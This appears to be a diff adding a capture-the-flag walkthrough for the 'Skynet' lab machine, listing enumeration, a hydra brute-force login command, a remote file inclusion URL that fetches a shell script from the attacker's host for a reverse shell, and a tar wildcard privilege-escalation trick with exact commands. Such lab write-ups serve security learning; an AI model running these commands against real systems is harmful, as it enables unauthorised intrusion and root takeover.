@@ -1,0 +1,30 @@
+--- Skynet ---
+
+1. Check nmap > Ports 22, 80, 110, 139, 143, and 445 are open.
+2. Seeing the port 80 open, we can say it must be a website. Though visiting the website gives nothing.
+3. Use gobuster with /usr/share/dirb/wordlists/common.txt wordlist to find any hidden directory. We get the /admin, /config, and
+   /squirrelmail directories, but we get a 403 error while visiting these except the /squirrelmail directory.
+4. Let's enumerate the smb using enum4linux. We get two shares //IP/anonymous and //IP/milesdyson. Now logging into the anonymous
+   share we get an interesting file which is "log1.txt" and it seems like a passwords list.
+5. Use burpsuite proxy to get parameter of the login.php and use hydra with the username "milesdyson" we got from smb enumeration
+   hydra -l milesdyson -P log1.txt $IP http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:incorrect"
+   This command gives us the password which is "cyborg007haloterminator".
+6. Logging into the SquirrelMail using the above creds gives us the smb password for the user "milesdyson" which is ")s{A&2Z=F^n_E.B`".
+7. Let's login into the smb using the command "smbclient -U milesdyson //$IP/milesdyson" and we get an interesting file that is
+   "notes/important.txt" which reveals a hidden directory "/45kra24zxs28v3yd". Though visiting this directory gives nothing.
+8. Use gobuster again in the above directory with /usr/share/dirb/wordlists/common.txt wordlist to find any hidden directory.
+   We get the /administrator directory.
+9. Searching for "cuppa" on ExploitDB we can see that there is an interesting entry which is "Cuppa CMS - '/alertConfigField.php'
+   Local/Remote File Inclusion". From here we get an exploit which is
+   "http://IP/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://local_ip/shell.php". Using nc (netcat), we
+   got a reverse shell and user.txt flag. We also got another interesting file in the backups directory which is "backup.sh". This script
+   backs up the contents of the /var/www/html directory using tar. We can easily exploit it using the trick mentioned here >
+   https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar
+10. But before exploiting, let's cd into the /var/www/html directory. Then create our reverse shell file shell.sh in this directory, then
+    follow the trick mentioned in the previous step, but use echo instead of touch.
+	chmod 777 shell.sh
+    	echo "" > "--checkpoint=1"
+	echo "" > "--checkpoint-action=exec=sh shell.sh"
+11. Next, listen to our port using nc (netcat) and we got a root shell along with our root.txt flag.
+
+--- Enjoy ---
